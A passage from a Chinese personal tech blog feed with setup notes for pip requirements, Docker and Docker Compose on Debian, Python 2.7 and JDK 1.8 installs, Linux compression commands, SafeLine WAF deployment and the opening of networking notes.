title="保存和复制"></a>保存和复制</h3><p>这里也就是requirement.txt的来源，pip有个参数叫freeze，它会把我们安装的包按要求的格式输出，也就是我们正常pip install一个包时指定的格式</p><p><img src="/../image/image-20240927120453979.png" alt="image-20240927120453979"></p><p>这时把它重定向到我们的requirement.txt就形成了我们平时在python项目中看到的那个requirement.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip freeze &gt; requirement.txt //命名没要求的，只是管理是命名成requirement.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240927120609267.png" alt="image-20240927120609267"></p><h2 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h2><p>其实，不一定要进入虚环境才能做到包管理，在Scripts目录下使用命令也是一样的效果，因为执行路径是优先从当前目录寻找的，所以在pycharm中，我们新建一个项目，要找一个已有的环境，可以按如下操作</p><p><img src="/../image/image-20240927112850744.png" alt="image-20240927112850744"></p><p>这里你把python.exe文件定下来它整个虚拟环境的位置就定下来了，再介绍其它的参数</p><p><img src="/../image/image-20240927120150563.png" alt="image-20240927120150563"></p><h2 id="vscode-python"><a href="#vscode-python" class="headerlink" title="vscode+python"></a>vscode+python</h2><p>在vscode中我们可以下载俩个插件</p><p><img src="/../image/image-20240927090115562.png" alt="image-20240927090115562"></p><p>第一个是语法检查，第二个是python环境的支持等，安装完后，我们可以在右下角选择python主文件，有时候打开一个工具，它会自动生成虚环境，并询问是否要下载requirement.txt的包，这一点是非常方便的。</p><p><img src="/../image/image-20240927093030048.png" alt="image-20240927093030048"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -env </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian安装docker/docker compose</title>
      <link href="/2024/09/26/Debian%E5%AE%89%E8%A3%85docker-docker-compose/"/>
      <url>/2024/09/26/Debian%E5%AE%89%E8%A3%85docker-docker-compose/</url>
      
        <content type="html"><![CDATA[<h1 id="Debian安装docker和docker-compose"><a href="#Debian安装docker和docker-compose" class="headerlink" title="Debian安装docker和docker compose"></a>Debian安装docker和docker compose</h1><p>参考链接：<a href="https://u.sb/debian-install-docker/%EF%BC%8C%E8%BF%99%E6%98%AF%E6%88%91%E7%94%A8%E8%BF%87**%E6%9C%80%E5%BF%AB**%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%8C0%E6%8A%A5%E9%94%99">https://u.sb/debian-install-docker/，这是我用过**最快**的教程，0报错</a></p><h2 id="使用官方源安装docker"><a href="#使用官方源安装docker" class="headerlink" title="使用官方源安装docker"></a>使用官方源安装docker</h2><p>首先，安装一些必要的软件包：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade -y</span><br><span class="line">apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates</span><br></pre></td></tr></table></figure><p>然后加入 Docker 的 GPG 公钥和 apt 源(我这里用的是TUNA源)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line">echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure><p>然后更新系统后即可安装 Docker CE 和 Docker Compose 插件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure><p>此时可以使用 <code>docker version</code> 命令检查是否安装成功：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eraser@debian:~$ sudo docker version</span><br><span class="line">[sudo] password for eraser:</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           27.3.1</span><br><span class="line"> API version:       1.47</span><br><span class="line"> Go version:        go1.22.7</span><br><span class="line"> Git commit:        ce12230</span><br><span class="line"> Built:             Fri Sep 20 11:41:11 2024</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          27.3.1</span><br><span class="line">  API version:      1.47 (minimum version 1.24)</span><br><span class="line">  Go version:       go1.22.7</span><br><span class="line">  Git commit:       xx</span><br><span class="line">  Built:            Fri Sep 20 11:41:11 2024</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.7.22</span><br><span class="line">  GitCommit:        xxx</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.14</span><br><span class="line">  GitCommit:        v1.1.14-0-g2c9f560</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        xx</span><br></pre></td></tr></table></figure><p>如果需要某个特定用户可以用 Docker <a href="https://www.cnblogs.com/cheyunhua/p/17703574.html">rootless</a> 模式运行 Docker，那么可以把这个用户也加入 docker 组，比如我们把 <code>www-data</code> 用户加进去：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker-ce-rootless-extras</span><br><span class="line">sudo usermod -aG docker www-data</span><br></pre></td></tr></table></figure><h2 id="安装Docker-Compose"><a href="#安装Docker-Compose" class="headerlink" title="安装Docker Compose"></a>安装Docker Compose</h2><p>因为我们已经安装了 <code>docker-compose-plugin</code>，所以 Docker 目前已经自带 <code>docker compose</code> 命令，基本上可以替代 <code>docker-compose</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@dibian:~ # docker compose version</span><br><span class="line">Docker Compose version v2.29.7</span><br></pre></td></tr></table></figure><p>如果某些镜像或命令不兼容，则我们还可以单独安装 Docker Compose,这里建议直接下载镜像再上传到debian中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>此时可以使用 <code>docker-compose version</code> 命令检查是否安装成功：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian:~# docker-compose version</span><br><span class="line">Docker Compose version v2.29.7</span><br></pre></td></tr></table></figure><h2 id="修改-Docker-配置"><a href="#修改-Docker-配置" class="headerlink" title="修改 Docker 配置"></a>修改 Docker 配置</h2><p>换源，限制日志文件大小，防止 Docker 日志塞满硬盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;仓库地址1&quot;,&quot;仓库地址2&quot;...]</span><br><span class="line">    &quot;log-driver&quot;: &quot;json-file&quot;,</span><br><span class="line">    &quot;log-opts&quot;: &#123;</span><br><span class="line">        &quot;max-size&quot;: &quot;20m&quot;,</span><br><span class="line">        &quot;max-file&quot;: &quot;3&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2><p>安装个onlinetools试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iceyhexman/onlinetools.git</span><br><span class="line">cd onlinetools</span><br><span class="line">docker build -t onlinetools .</span><br><span class="line">docker run -d -p 8000:8000 onlinetools</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> env </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian安装python2</title>
      <link href="/2024/09/25/Debian%E5%AE%89%E8%A3%85python2/"/>
      <url>/2024/09/25/Debian%E5%AE%89%E8%A3%85python2/</url>
      
        <content type="html"><![CDATA[<h1 id="Debian安装python2"><a href="#Debian安装python2" class="headerlink" title="Debian安装python2"></a>Debian安装python2</h1><p>依赖：<a href="https://www.cnblogs.com/lemanlai/p/12325343.html#:~:text=cd%20Python-">https://www.cnblogs.com/lemanlai/p/12325343.html#:~:text=cd%20Python-</a></p><p>教程：<a href="https://blog.csdn.net/lsmsrc/article/details/137104682#:~:text=%E6%9C%AC%E6%96%87%E8%AF%A6%E7%BB%86%E6%8F%8F%E8%BF%B0%E4%BA%86%E5%A6%82%E4%BD%95%E5%9C%A8">https://blog.csdn.net/lsmsrc/article/details/137104682#:~:text=%E6%9C%AC%E6%96%87%E8%AF%A6%E7%BB%86%E6%8F%8F%E8%BF%B0%E4%BA%86%E5%A6%82%E4%BD%95%E5%9C%A8</a></p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>Debian环境：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install zlib1g-dev libbz2-dev libssl-dev libncurses5-dev  libreadline-dev tk-dev libgdbm-dev libdb-dev libpcap-dev xz-utils libexpat-dev</span><br></pre></td></tr></table></figure><h2 id="下载并解压源文件"><a href="#下载并解压源文件" class="headerlink" title="下载并解压源文件"></a>下载并解压源文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz</span><br><span class="line">mkdir python2.7</span><br><span class="line">tar -xzf Python-2.7.18.tgz -C python2.7</span><br></pre></td></tr></table></figure><h2 id="进入源码目录"><a href="#进入源码目录" class="headerlink" title="进入源码目录"></a>进入源码目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd python2.7</span><br><span class="line">mv Python-2.7.18/* . //可以把前一个目录的东西全部提取到当前目录</span><br></pre></td></tr></table></figure><h2 id="进入源码目录后执行配置并生成-Makefile-文件"><a href="#进入源码目录后执行配置并生成-Makefile-文件" class="headerlink" title="进入源码目录后执行配置并生成 Makefile 文件"></a>进入源码目录后执行配置并生成 Makefile 文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装到 /usr/local/share/python2.7/bin/python 作为 python2 的文件</span><br><span class="line">&gt; ./configure --prefix=/usr/local/share/python2.7 # 不要增加其他参数，否则会编译通不过。</span><br></pre></td></tr></table></figure><h2 id="保证Make使用的是bash语法。直接将-Makefile-文件中-x2F-bin-x2F-sh-改成-x2F-bin-x2F-bash"><a href="#保证Make使用的是bash语法。直接将-Makefile-文件中-x2F-bin-x2F-sh-改成-x2F-bin-x2F-bash" class="headerlink" title="保证Make使用的是bash语法。直接将 Makefile 文件中 &#x2F;bin&#x2F;sh 改成 &#x2F;bin&#x2F;bash"></a>保证Make使用的是bash语法。直接将 Makefile 文件中 &#x2F;bin&#x2F;sh 改成 &#x2F;bin&#x2F;bash</h2><p><img src="/../image/image-20240926165336164.png" alt="image-20240926165336164"></p><h2 id="编译和安装python2"><a href="#编译和安装python2" class="headerlink" title="编译和安装python2"></a>编译和安装python2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; make</span><br><span class="line">&gt; sudo make install</span><br><span class="line">&gt; /usr/local/share/python2.7/bin/python2 -V</span><br><span class="line">  # 如果能看到python版本，说明就安装成功了。如 Python 2.7.18</span><br><span class="line"># python2 加入到Path环境</span><br><span class="line">&gt; sudo ln -s /usr/local/share/python2.7/bin/python2 /usr/bin/python2</span><br></pre></td></tr></table></figure><h2 id="安装pip2"><a href="#安装pip2" class="headerlink" title="安装pip2"></a>安装pip2</h2><p>pip2 也只能使用官方脚本 get-pip.py 安装。记得把脚本第一行的 python 改成 python2，因为上一步，我们只创建了 python2 的连接，没有创建 python 的连接。主要考虑到，你的机器上可能已经存在了 python 连接，并指向了 python3</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下载脚本源文件</span><br><span class="line">&gt; wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line"># 修改 get-pip.py 第一行内容，把 python 改成 python2</span><br><span class="line"># 给脚本添加可执行权限</span><br><span class="line">&gt; chmod 755 get-pip.py</span><br><span class="line"># 执行安装pip脚本，默认安装目录就是 python2 所在目录即 /usr/local/share/python2.7/bin</span><br><span class="line">&gt; ./get-pip.py</span><br><span class="line"># /usr/local/share/python2.7/bin 目录下面应该有了pip 和 pip2 两个文件</span><br><span class="line">&gt; /usr/local/share/python2.7/bin/pip2 -V </span><br><span class="line"># 如果能看到pip版本信息，说明安装成功了。如 pip 20.3.4 from /usr/local/lib/python2.7/site-packages/pip (python 2.7)</span><br><span class="line"># 如果这里报错，可能pip被安装到了其他位置。我们可以用 where pip2</span><br><span class="line">&gt; whereis pip2</span><br><span class="line">pip2: /home/yourname/.local/bin/pip2</span><br><span class="line">&gt; pip2_path=&quot;$(whereis pip2 | awk &#x27;&#123;print $2&#125;&#x27;)&quot;</span><br><span class="line">&gt; $pip2_path -V</span><br><span class="line"># 如果能看到pip版本信息，也能说明安装成功了。如 pip 20.3.4 from home/yourname/.local/lib/python2.7/site-packages/pip (python 2.7) 如果是这种情况，你就不用把 pip2 加入 Path 环境了，也就是说下一条命令可以不用执行了。因为 $HOME/.local/bin 默认已经在 Path 中了</span><br><span class="line"># 看情况。是否执行，把 pip2 加入到 Path 环境</span><br><span class="line">&gt; sudo ln -s /usr/local/share/python2.7/bin/pip2 /usr/bin/pip2</span><br></pre></td></tr></table></figure><p>在执行get-pip.py时，因为网络问题，可能一次的包是下不全的，需要多执行几次</p><p>教程后面的虚环境一直没装好，不懂为什么</p>]]></content>
      
      
      
        <tags>
            
            <tag> env </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian安装jdk1.8</title>
      <link href="/2024/09/25/Debian%E5%AE%89%E8%A3%85jdk1-8/"/>
      <url>/2024/09/25/Debian%E5%AE%89%E8%A3%85jdk1-8/</url>
      
        <content type="html"><![CDATA[<h1 id="Debian系统安装jdk1-8"><a href="#Debian系统安装jdk1-8" class="headerlink" title="Debian系统安装jdk1.8"></a>Debian系统安装jdk1.8</h1><h2 id="第一步：下载安装包"><a href="#第一步：下载安装包" class="headerlink" title="第一步：下载安装包"></a><strong>第一步：下载安装包</strong></h2><p>下载Linux环境下的jdk8，请去（<a href="https://www.oracle.com/java/technologies/downloads/#java8">Java Downloads | Oracle</a>）中下载jdk的安装文件；</p><p>由于我的Linux是64位的，因此我下载<a href="https://download.oracle.com/otn/java/jdk/8u421-b09/d8aa705069af427f9b83e66b34f5e380/jdk-8u421-linux-x64.tar.gz?AuthParam=1727273412_7becc15c0d9e33a996992a5ed5efa3a2">jdk-8u421-linux-x64.tar.gz</a></p><h2 id="第二步、解压安装包"><a href="#第二步、解压安装包" class="headerlink" title="第二步、解压安装包"></a><strong>第二步、解压安装包</strong></h2><p>将我们在windows上下载好的JDK安装包用wincp上传到debian，进行解压</p><p>新建&#x2F;etc&#x2F;java文件夹,解压至当前目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/java</span><br><span class="line">tar -zxvf jdk-8u421-linux-x64.tar.gz</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240925224208442.png" alt="image-20240925224208442"></p><h2 id="第三步、修改环境变量"><a href="#第三步、修改环境变量" class="headerlink" title="第三步、修改环境变量"></a><strong>第三步、修改环境变量</strong></h2><p>至此，我们最后需要修改环境变量，通过命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/profile</span><br></pre></td></tr></table></figure><p>在文件末尾添加</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/etc/java/jdk1.8.0_421/</span><br><span class="line">export JRE_HOME=/etc/java/jdk1.8.0_421/jre</span><br><span class="line">export CLASSPATH=.:$CLASSPATH:$JAVA_HOME/lib:$JRE_HOME/lib</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br></pre></td></tr></table></figure><p>然后，保存并退出</p><p>之后，通过命令source &#x2F;etc&#x2F;profile或重启电脑profile文件配置立即生效</p><h2 id="第四步、测试是否安装成功"><a href="#第四步、测试是否安装成功" class="headerlink" title="第四步、测试是否安装成功"></a><strong>第四步、测试是否安装成功</strong></h2><p>使用java -version，出现版本为java version “1.8.0_421”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240925224412204.png" alt="image-20240925224412204"></p>]]></content>
      
      
      
        <tags>
            
            <tag> env </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux压缩工具</title>
      <link href="/2024/09/25/Linux%E5%8E%8B%E7%BC%A9%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/09/25/Linux%E5%8E%8B%E7%BC%A9%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux压缩与打包"><a href="#Linux压缩与打包" class="headerlink" title="Linux压缩与打包"></a>Linux压缩与打包</h1><h2 id="常见压缩格式"><a href="#常见压缩格式" class="headerlink" title="常见压缩格式"></a>常见压缩格式</h2><p>在Windows下，我们最常见的压缩文件后缀格式有</p><ul><li><p>rar：rar在Linux下很少见，因为linux默认是无法识别此格式</p></li><li><p>zip：一种常见兼容的格式</p></li><li><p>在Linux下，我们最常见的压缩文件后缀格式有(还有其他格式)<br>gz：由gzip压缩</p></li><li><p>bz2：由bzip2压缩</p></li><li><p>tar：由tar打包</p></li><li><p>tar.gz：由tar打包后再用gzip压缩</p></li><li><p>tar.bz2：由tar打包后再用bzip2压缩</p></li><li><p>tar.xz：由tar打包后再用xz压缩</p></li><li><p>zip：一种常见兼容的格式</p></li></ul><p>打包在Linux下通常是tar</p><h4 id="压缩与打包有什么区别"><a href="#压缩与打包有什么区别" class="headerlink" title="压缩与打包有什么区别?"></a>压缩与打包有什么区别?</h4><p>打包是将多个文件或目录合并成一个文件</p><p>压缩是将单个文件使用压缩算法，减小体积</p><h2 id="压缩工具使用"><a href="#压缩工具使用" class="headerlink" title="压缩工具使用"></a>压缩工具使用</h2><h3 id="gzip压缩工具"><a href="#gzip压缩工具" class="headerlink" title="gzip压缩工具"></a>gzip压缩工具</h3><p>压缩:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gzip filename</span><br><span class="line">gzip -# 文件名 //这里-#表示压缩等级，取值为1~9，1为最快压缩，9为最大压缩，默认为6</span><br></pre></td></tr></table></figure><p>解压文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gzip -d 压缩文件</span><br></pre></td></tr></table></figure><p><strong>注意:gzip压缩或解压缩，都会删除源文件</strong></p><p><img src="/../image/image-20240925213407755.png" alt="image-20240925213407755"></p><h3 id="bzip2压缩工具"><a href="#bzip2压缩工具" class="headerlink" title="bzip2压缩工具"></a>bzip2压缩工具</h3><p>压缩：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bzip2 -z filename //-z也可以不加</span><br></pre></td></tr></table></figure><p>解压缩：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bzip2 -d filename</span><br></pre></td></tr></table></figure><p><strong>不管是gzip还是bzip2，都不能压缩文件夹</strong></p><p>xz压缩工具，用法与gzip2一致</p><h3 id="zip压缩工具"><a href="#zip压缩工具" class="headerlink" title="zip压缩工具"></a>zip压缩工具</h3><p>zip是可以压缩目录的</p><p>zip不会删除压缩的文件<br>压缩</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip-r TargetFileName 被压缩目录  //目录</span><br><span class="line"></span><br><span class="line">zip TargerFileName 被压缩文件</span><br></pre></td></tr></table></figure><p>解压缩</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 被解压文件 -d TargetPath</span><br><span class="line"></span><br><span class="line">unzip 被解压文件//默认解压到当前路径</span><br></pre></td></tr></table></figure><h2 id="打包工具使用"><a href="#打包工具使用" class="headerlink" title="打包工具使用"></a>打包工具使用</h2><h3 id="tar打包工具"><a href="#tar打包工具" class="headerlink" title="tar打包工具"></a>tar打包工具</h3><p>tar本身是一个打包工具，将多个文件整合成一个大文件</p><p>tar将文件打包后，可以使用各种压缩工具进行压缩</p><p>tar的常用参数说明:</p><ul><li><code>-z</code>表示使用gzip压缩</li><li><code>-j</code>表示使用bzip2压缩</li><li><code>-J</code>表示使用xz压缩</li><li><code>-x</code>表示解包，或解压缩</li><li><code>-c</code>表示建立一个tar包</li><li><code>-f</code>后跟具体文件名，指定文件</li><li><code>-v</code>显示操作的详细信息</li></ul><p>tree查看目录test2结构</p><p>tar-cvf test2.tar test2</p><p>将test2目录打包成test2.tar文件</p><p><img src="/../image/image-20240925214039715.png" alt="image-20240925214039715"></p><p>打包同时，使用压缩算法，加入相应的参数即可</p><p>-z 表示gzip</p><p>-j表示bz2</p><p>注意，生成文件的后缀名要写清楚，这样便于解压</p><p><img src="/../image/image-20240925214032184.png" alt="image-20240925214032184"></p><h3 id="解包tar包"><a href="#解包tar包" class="headerlink" title="解包tar包"></a>解包tar包</h3><p>解包和打包不同的是</p><p>使用-x表示解包，替换之前的创建-c</p><p>同样使用-z表示gzip算法</p><p>如果使用-j，对gz文件，则报错</p><p><img src="/../image/image-20240925214123322.png" alt="image-20240925214123322"></p><p>使用-tf参数直接查看打包内容<br><img src="/../image/image-20240925214210696.png" alt="image-20240925214210696"></p><p>排除选项</p><p>–exclude 文件名</p><p>不需要指定具体的排除文件路径，有多个重名文件都会被排除掉</p><p><img src="/../image/image-20240925214244494.png" alt="image-20240925214244494"></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>雷池waf部署</title>
      <link href="/2024/09/18/%E9%9B%B7%E6%B1%A0waf%E9%83%A8%E7%BD%B2/"/>
      <url>/2024/09/18/%E9%9B%B7%E6%B1%A0waf%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="雷池waf部署"><a href="#雷池waf部署" class="headerlink" title="雷池waf部署"></a>雷池waf部署</h1><h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>安装雷池前请确保你的系统环境符合以下要求</p><ul><li>操作系统：Linux</li><li>CPU 指令架构：x86_64</li><li>CPU 指令架构：支持 ssse3 指令集</li><li>软件依赖：Docker 20.10.14 版本以上</li><li>软件依赖：Docker Compose 2.0.0 版本以上</li><li>最低资源需求：1 核 CPU &#x2F; 1 GB 内存 &#x2F; 5 GB 磁盘</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -m                                    # 查看指令架构</span><br><span class="line">cat /proc/cpuinfo| grep &quot;processor&quot;         # 查看 CPU 信息</span><br><span class="line">lscpu | grep ssse3                          # 确认 CPU 是否支持 ssse3 指令集</span><br><span class="line">docker version                              # 查看 Docker 版本</span><br><span class="line">docker compose version                      # 查看 Docker Compose 版本</span><br><span class="line">docker-compose version                      # 查看老版本 docker-compose 版本</span><br><span class="line">free -h                                     # 查看内存信息</span><br><span class="line">df -h                                       # 查看磁盘信息</span><br></pre></td></tr></table></figure><p>这里的docker compose和docker-compose还不是一个东西<a href="https://www.cnblogs.com/zhaodalei/p/17553269.html">https://www.cnblogs.com/zhaodalei/p/17553269.html</a></p><p><img src="/../image/image-20240918151709478.png" alt="image-20240918151709478"></p><p>我这里没有docker-compose，所以补充下环境<a href="https://www.cnblogs.com/beiluoshimen/p/18296295">https://www.cnblogs.com/beiluoshimen/p/18296295</a></p><p>下载docker-compose软件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/docker/compose/releases/download/v2.16.0/docker-compose-linux-x86_64</span><br></pre></td></tr></table></figure><p>移动下载软件到&#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose覆盖旧版本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv docker-compose-linux-x86_64 /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240918153052566.png" alt="image-20240918153052566"></p><h2 id="安装雷池"><a href="#安装雷池" class="headerlink" title="安装雷池"></a>安装雷池</h2><p>准备好离线安装包</p><p><img src="/../image/image-20240918162419106.png" alt="image-20240918162419106"></p><p>上传到离线环境中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat image.tar.gz | gzip -d | docker load</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240918162647259.png" alt="image-20240918162647259"></p><p>创建容器持久化目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /data/safeline</span><br><span class="line">cd /data/safeline</span><br></pre></td></tr></table></figure><p>下载compose.yaml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://waf-ce.chaitin.cn/release/latest/compose.yaml</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240918163003676.png" alt="image-20240918163003676"></p><p>yaml文件不用修改，创建一个.env的文件</p><h2 id="配置-compose-环境变量"><a href="#配置-compose-环境变量" class="headerlink" title="配置 compose 环境变量"></a>配置 compose 环境变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch &quot;.env&quot;</span><br></pre></td></tr></table></figure><p>根据你的实际情况修改配置文件中的 <code>&#123;safeline-dir&#125;</code> 和 <code>&#123;postgres-password&#125;</code> 字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAFELINE_DIR=/data/safeline</span><br><span class="line">IMAGE_TAG=latest</span><br><span class="line">MGT_PORT=9443</span><br><span class="line">POSTGRES_PASSWORD=123456</span><br><span class="line">SUBNET_PREFIX=172.22.222</span><br><span class="line">IMAGE_PREFIX=swr.cn-east-3.myhuaweicloud.com/chaitin-safeline</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240918163639948.png" alt="image-20240918163639948"></p><h2 id="启动雷池"><a href="#启动雷池" class="headerlink" title="启动雷池"></a>启动雷池</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240918163736287.png" alt="image-20240918163736287"></p><h2 id="访问雷池控制台"><a href="#访问雷池控制台" class="headerlink" title="访问雷池控制台"></a>访问雷池控制台</h2><p>雷池安装成功以后，你可以打开浏览器访问 <code>https://&lt;safeline-ip&gt;:9443/</code> 来使用雷池控制台。</p><p><img src="/../image/image-20240918163938320.png" alt="image-20240918163938320"></p><p>这里的账号密码可以需要运行容器中的命令获取，可以用ss命令查看9443是否处于监听状态</p><p><a href="https://bashcommandnotfound.cn/article/linux-ss-command">https://bashcommandnotfound.cn/article/linux-ss-command</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss -tlwn</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240918164135224.png" alt="image-20240918164135224"></p><p>如果有防火墙需要放行下端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --add-port=9443/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>然后获取下账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec safeline-mgt resetadmin</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240918164315166.png" alt="image-20240918164315166"></p><p><img src="/../image/image-20240918164347838.png" alt="image-20240918164347838"></p><p>waf本质就是一个反向代理服务器，监听来自外部的请求，并将其转发到上游服务器</p>]]></content>
      
      
      
        <tags>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2024/09/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2024/09/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="计网的产生与发展"><a href="#计网的产生与发展" class="headerlink" title="计网的产生与发展"></a>计网的产生与发展</h2><h3 id="网络的发展历程"><a href="#网络的发展历程" class="headerlink" title="网络的发展历程"></a>网络的发展历程</h3><ol><li><p>前网络时代</p></li><li><p>萌芽阶段</p><p>分时系统</p><p><img src="/../image/image-20240915173535226.png" alt="image-20240915173535226"></p></li><li><p>雏形阶段</p><p>公共电话网络采取的通信方式称为–电路交换</p><p><img src="/../image/image-20240915173555829.png" alt="image-20240915173555829"></p></li><li><p>诞生阶段</p><p>计算机网络是20世纪60年代美苏冷战时期的产物</p></li><li><p>滕飞阶段</p></li></ol><p>​WWW万维网</p><p>​要求：</p><p>​用于计算机之间的数据传输</p><p>​能够连接不同类型的计算机</p><p>​所有的网络节点都同等重要</p><p>​必须有冗余的路由</p><p>​尽可能简单，但能够非常可靠地传递数据</p><h3 id="操作系统发展的4个阶段"><a href="#操作系统发展的4个阶段" class="headerlink" title="操作系统发展的4个阶段"></a>操作系统发展的4个阶段</h3><ul><li>第一代(1946年-1955年):真空管时代，无操作系统</li><li>第二代(1955年-1965年):晶体管时代，批处理系统</li><li>第三代(1965年-1980年):集成电路时代，多道程序设计</li><li>第四代(1980年至今):大规模和超大规模集成电路时代，分时系统。现代计算机正向着巨型、微型、并行、分布、网络化和智能化几个方面发展。</li></ul><h3 id="发展中的网络种类"><a 